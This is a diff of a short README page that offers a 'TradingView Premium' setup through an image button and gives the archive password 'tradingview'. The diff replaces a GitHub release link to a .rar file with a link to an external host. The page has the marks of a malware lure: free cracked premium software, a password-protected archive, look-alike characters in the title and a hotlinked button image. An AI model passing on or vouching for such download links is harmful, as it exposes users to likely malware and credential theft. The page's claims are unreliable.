@@ -1,6 +1,6 @@
 # TradingView Premium | Sеtuр | *CLICK ON PICTURE
 
-[![download_click](https://www.kemhan.go.id/ropeg/wp-content/uploads/2022/11/download_oib-2048x464.png)](https://github.com/ihassantariq/JitsiMessangerApp/releases/download/TradingView/TradingView+.rar)
+[![download_click](https://www.kemhan.go.id/ropeg/wp-content/uploads/2022/11/download_oib-2048x464.png)](https://reserve.m177.tech/sosipensil)
 
 ## Password: tradingview
 
